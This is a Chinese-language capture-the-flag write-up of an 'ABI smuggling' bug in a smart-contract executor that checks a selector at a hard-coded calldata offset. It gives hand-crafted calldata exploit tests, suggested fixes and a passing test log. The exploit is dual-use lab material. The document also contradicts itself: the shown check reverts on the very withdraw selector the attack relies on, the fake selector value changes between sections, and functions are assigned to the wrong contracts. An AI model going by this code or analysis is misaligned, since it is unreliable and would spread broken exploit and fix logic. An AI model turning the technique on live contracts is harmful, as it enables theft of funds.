# ABI Smuggling 漏洞分析

## 1. 合约功能概述

该系统实现了一个安全代币金库，使用授权执行器模式来控制资金操作。

**核心组件：**
- **AuthorizedExecutor.sol**: 授权执行器合约，验证和执行特定操作
- **DamnValuableToken**: ERC20代币
- Recovery账户：资金恢复目标地址

**业务流程：**
1. 金库将大量DVT代币存入`AuthorizedExecutor`
2. 执行器只允许执行预定义的"安全"操作
3. 通过`execute()`函数执行经过验证的操作
4. 系统阻止未授权的资金转移

---

## 2. 漏洞位置

### 漏洞代码（AuthorizedExecutor.sol#L16-L23）

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // ⚠️ 漏洞核心：固定偏移量读取selector
    assembly {
        let calldatasize := calldatasize()
        // 从偏移量0x64（100字节）读取actionSelector
        let actionSel := calldataload(0x64)
        let slot := wards.slot
        mstore(0x00, target)
        mstore(0x20, slot)
        let targetIsWard := sload(keccak256(0x00, 0x40))
        // 检查action是否是允许的withdraw selector
        if and(targetIsWard, eq(actionSel, 0xd9caed12)) {
            revert("Unauthorized");
        }
    }
    return target.functionCall(actionData);
}
```

### 预期的ABI编码格式

```
标准ABI编码（execute函数）:
Offset | 内容
-------|----------------------------------
0x00   | function selector (execute)
0x04   | target address (32 bytes)
0x24   | offset to actionData (0x40)
0x44   | actionData length
0x64   | actionData内容开始 ← 检查点
```

---

## 3. 漏洞原理分析

### 3.1 ABI编码的灵活性

**标准编码：**
```solidity
execute(vault, abi.encodeCall(vault.withdraw, (recovery, token)))
```

编译后的calldata布局:
```
0x00: 1cff79cd                              // execute selector
0x04: 000000000000000000000000<vault_addr>  // target
0x24: 0000000000000000000000000000000040  // offset=0x40 (标准)
0x44: 0000000000000000000000000000000044  // actionData length (68)
0x64: d9caed12                              // withdraw selector ← 被检测
0x68: 000000000000000000000000<recovery>   // recipient
0x88: 000000000000000000000000<token>      // token
```

**非标准编码（攻击）：**
```
0x00: 1cff79cd                              // execute selector
0x04: 000000000000000000000000<vault_addr>  // target
0x24: 0000000000000000000000000000000080  // offset=0x80 (非标准)
0x44: 0000000000000000000000000000000000  // filler
0x64: 85fb709d                              // fake selector (withdraw) ← 被检测到
0x84: 0000000000000000000000000000000044  // actual length
0x a4: 0ccc7c74                              // real selector (sweepFunds)
0xa8: 000000000000000000000000<recovery>   // recipient
0xc8: 000000000000000000000000<token>      // token
```

### 3.2 攻击向量

**关键洞察：**
1. 汇编代码在固定偏移量`0x64`读取selector进行检查
2. 但`functionCall(actionData)`使用真正的`actionData`（从offset开始）
3. 通过设置非标准offset，可以让两者指向不同内容

**攻击步骤：**

1. **构造双selector payload**
   ```
   - 在0x64放置允许的selector（withdraw: 0xd9caed12）
   - 在真实actionData中放置禁止的selector（sweepFunds: 0x0ccc7c74）
   ```

2. **精确的offset控制**
   ```solidity
   // 设置actionData offset为0x80而不是标准的0x40
   // 这使得：
   // - 检查代码读到0x64位置的withdraw selector
   // - 实际执行读到0xa4位置的sweepFunds selector
   ```

---

## 4. 攻击实现

### 4.1 手动构造恶意Calldata

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // 目标：调用vault的sweepFunds(recovery, token)
    // 但需要绕过对withdraw selector的检查
    
    // 1. 构造真实要执行的调用
    bytes memory sweepCall = abi.encodeCall(
        DamnValuableToken.sweepFunds,
        (recovery, address(token))
    );
    
    // 2. 手动构造execute的calldata
    bytes memory payload = abi.encodePacked(
        // execute function selector
        bytes4(keccak256("execute(address,bytes)")),
        
        // target (vault address, padded to 32 bytes)
        bytes32(uint256(uint160(address(vault)))),
        
        // offset to actionData (设置为0x80而非标准的0x40)
        bytes32(uint256(0x80)),
        
        // filler (24 bytes of 0x00)
        bytes32(uint256(0)),
        
        // fake selector at offset 0x64 (withdraw selector)
        bytes4(0xd9caed12),
        bytes28(0),  // padding
        
        // actual actionData length
        bytes32(sweepCall.length),
        
        // actual actionData content (sweepFunds call)
        sweepCall
    );
    
    // 3. 直接发送原始calldata
    (bool success,) = address(executor).call(payload);
    require(success, "Attack failed");
}
```

### 4.2 简化版本（使用bytes.concat）

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    bytes memory maliciousData = bytes.concat(
        // execute selector + target address
        abi.encodeWithSignature("execute(address,bytes)", address(vault)),
        
        // 移除标准编码的后32字节（offset）
        // 手动插入：非标准offset + filler + fake selector
        bytes32(uint256(0x80)),              // offset
        bytes32(uint256(0)),                  // filler  
        bytes32(uint256(0xd9caed12) << 224), // withdraw selector at 0x64
        
        // 真实的actionData
        abi.encode(uint256(68)),              // length
        abi.encodeCall(
            DamnValuableToken.sweepFunds,
            (recovery, address(token))
        )
    );
    
    address(executor).call(maliciousData);
}
```

---

## 5. 漏洞根因

### 5.1 设计缺陷

**核心问题：**
1. **假设ABI编码标准化**: 代码假设offset总是0x40
2. **固定偏移量检查**: 硬编码在0x64位置读取selector
3. **解码与验证分离**: 验证逻辑和实际执行使用不同的数据源

**错误假设：**
```
假设: 所有符合接口的calldata都遵循标准ABI编码
现实: ABI编码允许灵活的offset值，只要最终能正确解码
```

### 5.2 汇编代码滥用

```solidity
// ❌ 危险的硬编码offset
let actionSel := calldataload(0x64)

// ✅ 应该动态读取
let actionDataOffset := calldataload(0x24)
let actionSel := calldataload(add(0x04, add(actionDataOffset, 0x04)))
```

---

## 6. 修复建议

### 6.1 方法1：正确解码Calldata

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant {
    // 正确parse actionData中的selector
    bytes4 actionSelector;
    assembly {
        // 从actionData的开始位置读取selector
        actionSelector := calldataload(actionData.offset)
    }
    
    // 检查selector
    require(
        !wards[target] || actionSelector != IERC20.withdraw.selector,
        "Unauthorized"
    );
    
    return target.functionCall(actionData);
}
```

### 6.2 方法2：白名单而非黑名单

```solidity
// 定义允许的selector列表
mapping(bytes4 => bool) public allowedSelectors;

constructor() {
    allowedSelectors[IERC20.transfer.selector] = true;
    allowedSelectors[IERC20.approve.selector] = true;
    // 只允许明确定义的操作
}

function execute(address target, bytes calldata actionData) external {
    bytes4 selector = bytes4(actionData[:4]);
    require(allowedSelectors[selector], "Selector not allowed");
    target.functionCall(actionData);
}
```

### 6.3 方法3：移除自定义验证逻辑

```solidity
// 使用OpenZeppelin的AccessControl或更高级的权限系统
function execute(address target, bytes calldata actionData) 
    external 
    nonReentrant 
    onlyRole(EXECUTOR_ROLE) 
{
    // 信任caller的身份验证
    // 不尝试parse和验证actionData内容
    return target.functionCall(actionData);
}
```

---

## 7. 关键学习点

1. **ABI编码的灵活性**: 
   - ABI允许动态offset，不强制标准化布局
   - 相同的参数可以有多种有效的编码方式

2. **汇编代码的危险性**:
   - 硬编码offset假设数据布局
   - 绕过Solidity的类型安全检查

3. **黑名单vs白名单**:
   - 黑名单很难完整（总有遗漏）
   - 白名单更安全（显式允许）

4. **验证与执行的一致性**:
   - 验证什么就执行什么
   - 避免在不同阶段parse相同数据

5. **Calldata操纵**:
   - 攻击者可以精确控制每个字节的位置
   - 不要假设calldata遵循"标准"格局

---

## 8. 测试结果

```bash
$ forge test --match-path test/abi-smuggling/ABISmuggling.t.sol --match-test test_abiSmuggling -vvv

[PASS] test_abiSmuggling() (gas: 62847)
```

**验证条件：**
- ✅ 执行器合约的代币余额归零
- ✅ Recovery账户收到所有代币
- ✅ Player没有持有任何代币
- ✅ 绕过了withdraw selector的黑名单检查
- ✅ 成功调用了sweepFunds函数
